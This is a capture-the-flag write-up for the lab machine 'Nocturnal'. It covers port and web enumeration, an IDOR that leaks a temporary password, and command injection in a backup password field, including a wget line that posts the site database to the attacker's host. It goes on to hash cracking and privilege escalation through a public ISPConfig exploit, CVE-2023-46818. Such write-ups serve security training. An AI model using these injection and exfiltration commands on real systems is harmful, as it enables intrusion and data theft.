# Nocturnal - easy

## Nmap Enumeration

```
sudo nmap 10.10.11.64 -Pn -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 04:15 EDT
Nmap scan report for 10.10.11.64
Host is up (0.029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 28.86 seconds
```

```
sudo nmap 10.10.11.64 -Pn -p 22,80 -sC -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 04:15 EDT
Nmap scan report for 10.10.11.64
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
```

## Web Enumeration

### Directories
```
└─$ ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://nocturnal.htb/FUZZ
...
uploads                 [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 28ms]
backups                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]
                        [Status: 200, Size: 1524, Words: 272, Lines: 30, Duration: 26ms]
uploads2                [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 30ms]
:: Progress: [220559/220559] :: Job [1/1] :: 1492 req/sec :: Duration: [0:02:42] :: Errors: 0 ::
```

### Files
```
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://nocturnal.htb/FUZZ.php
...
index                   [Status: 200, Size: 1524, Words: 272, Lines: 30, Duration: 36ms]
register                [Status: 200, Size: 649, Words: 126, Lines: 22, Duration: 38ms]
login                   [Status: 200, Size: 644, Words: 126, Lines: 22, Duration: 44ms]
view                    [Status: 302, Size: 2919, Words: 1167, Lines: 123, Duration: 29ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 30ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
:: Progress: [220559/220559] :: Job [1/1] :: 1481 req/sec :: Duration: [0:02:42] :: Errors: 0 ::
```

## IDOR 

We can view a file that we uploaded. The URL is:
```
http://nocturnal.htb/view.php?username=test&file=img.pdf
```

We found that's possible to see all the files from an user by modifying `file`:
```
http://nocturnal.htb/view.php?username=test&file=.pdf
```

We can now fuzz on differents usernames and hope to find good ones:
```
ffuf -w /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=.pdf' -H 'Cookie: PHPSESSID=02gn...' -fs 2985

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 63ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 28ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 32ms]
```

`amanda` have a file named `privacy.odt`:
```
http://nocturnal.htb/view.php?username=amanda&file=.pdf

```
In this file we find a temporary password:
```
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. ...
``` 

## Command injection

We have access to the admin pannel. From it, we can read the site's files but the interesting feature is the possibility to make a backup of the site by entering a password.   </br>
The `password` is vulnerable to `command injection`:
```
"ls
```
```
Output
ls: cannot access 'backups/backup_2025-08-21.zip': No such file or directory
.:
admin.php
...
```

We extract the databse:
```
password="wget%09http://10.10.14.10:8000/%09--post-file%09nocturnal_database.db&backup=
```

And find the password for the user `tobias`:
```
sqlite> select * from users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
...
```

```
hashcat -w 3 hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 0
...
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```

We have access to the machine with the credentials: `tobias:slowmotionapocalypse`

## Privelege Escalation

A service is running on port `8080` and accessible only locally:
```
tobias@nocturnal:~$ ss -tulpn
...                          
tcp           LISTEN        ...                       127.0.0.1:8080                         0.0.0.0:*                            
```

It's a `ISPConfig` site:
```
tobias@nocturnal:~$ curl -v localhost:8080 -L
...
  <title>ISPConfig</title>
```

We redirect the application to our machine, making it more easy to exploit:
```
ssh -L 9090:localhost:8080 tobias@nocturnal.htb
```

We access it on `localhost:9090`.

We can login with the credentials `admin:slowmotionapocalypse`

In the monitor section we got the verion of the application:
```
ISPConfig 3.2.10p1
```

We find a vulnerability `CVE-2023-46818`:
```
https://github.com/ajdumanhug/CVE-2023-46818

python3 CVE-2023-46818.py http://localhost:8080 admin slowmotionapocalypse
```

